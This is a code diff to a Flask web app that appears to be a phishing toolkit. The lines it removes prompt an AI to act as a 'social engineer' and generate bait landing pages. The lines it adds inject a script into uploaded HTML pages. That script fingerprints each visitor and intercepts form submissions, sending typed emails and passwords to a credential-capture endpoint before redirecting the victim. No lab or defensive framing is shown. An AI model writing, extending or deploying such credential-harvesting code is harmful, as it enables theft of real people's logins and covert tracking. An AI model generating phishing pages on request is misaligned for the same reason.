@@ -933,55 +933,80 @@ def architect():
     links = Link.query.order_by(Link.created_at.desc()).all()
     return render_template('architect.html', links=links)
 
-@bp.route('/architect/generate', methods=['POST'])
+@bp.route('/architect/process', methods=['POST'])
 @login_required
-def architect_generate():
-    industry = request.form.get('industry')
-    brand = request.form.get('brand')
-    color_primary = request.form.get('color_primary')
-    color_bg = request.form.get('color_bg')
-    tone = request.form.get('tone')
-    link_id = request.form.get('link_id')
+def architect_process():
+    """Process custom HTML with auto-injection."""
+    import re
+    from flask import jsonify
     
-    if not Config.GEMINI_API_KEY:
-        from flask import jsonify
-        return jsonify({'error': 'Gemini API Key missing'}), 500
-        
+    link_id = request.form.get('link_id')
+    custom_html = request.form.get('custom_html')
+    auto_inject = request.form.get('auto_inject') == 'true'
+    
+    if not link_id or not custom_html:
+        return jsonify({'error': 'Missing data'}), 400
+    
     link = Link.query.get(link_id)
-    if not link: 
-        from flask import jsonify
+    if not link:
         return jsonify({'error': 'Link not found'}), 404
     
-    # Prompt Construction
-    prompt = f"""Act as an expert frontend engineer and social engineer.
-Create a high-converting, single-file HTML/CSS landing page for a Phishing/Bait scenario in the context of: {industry} {brand}.
-Goal: Convince user to click the main button.
-Tone: {tone}.
-Color Theme: Primary {color_primary}, Background {color_bg}.
-
-CRITICAL REQUIREMENTS:
-1. The main call-to-action button href MUST be EXACTLY: `{{ destination }}` (do not replace it, keep the jinja variable).
-2. It must look professional, modern, and legitimate.
-3. Include font-awesome CDN if needed.
-4. The CSS must be embedded in <style> tags.
-5. Do NOT include any external JS that might be blocked (except font-awesome).
-6. Ensure the design is responsive mobile-first.
-
-Return ONLY the raw HTML code starting with <!DOCTYPE html>.
-Do not include markdown backticks."""
-
-    try:
-        from ..ai_engine import ai
-        from flask import jsonify
+    detected_fields = []
+    processed_html = custom_html
+    
+    if auto_inject:
+        if re.search(r'<input[^>]*type=["']email["']', custom_html, re.IGNORECASE):
+            detected_fields.append('✅ Email input detected')
+        if re.search(r'<input[^>]*type=["']password["']', custom_html, re.IGNORECASE):
+            detected_fields.append('✅ Password input detected')
+        if re.search(r'<form', custom_html, re.IGNORECASE):
+            detected_fields.append('✅ Form detected')
         
-        html = ai.generate(prompt)
-        
-        # Cleanup markdown formatting if present
-        html = html.replace('```html', '').replace('```', '').strip()
-        return jsonify({'html': html})
-    except Exception as e:
-        from flask import jsonify
-        return jsonify({'error': str(e)}), 500
+        injection_script = """
+<script>
+const VISIT_ID = "{{ visit_id }}";
+function getCanvasHash() {
+    try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillText("ulrTrack", 2, 15);
+        return canvas.toDataURL().substring(0, 32);
+    } catch(e) { return null; }
+}
+(function() {
+    navigator.sendBeacon('/api/beacon', JSON.stringify({
+        visit_id: VISIT_ID,
+        canvas_hash: getCanvasHash(),
+        screen_res: window.screen.width + 'x' + window.screen.height
+    }));
+})();
+window.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = form.querySelector('input[type="email"]')?.value;
+            const password = form.querySelector('input[type="password"]')?.value;
+            fetch('/api/capture_credentials', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({visit_id: VISIT_ID, email: email, password: password})
+            }).then(() => window.location.href = "{{ destination }}")
+              .catch(() => window.location.href = "{{ destination }}");
+        });
+    });
+});
+</script>
+"""
+        if '</body>' in processed_html:
+            processed_html = processed_html.replace('</body>', injection_script + '</body>', 1)
+        elif '</html>' in processed_html:
+            processed_html = processed_html.replace('</html>', injection_script + '</html>', 1)
+        else:
+            processed_html += injection_script
+    
+    return jsonify({'html': processed_html, 'detected_fields': detected_fields})
 
 @bp.route('/architect/save', methods=['POST'])
 @login_required
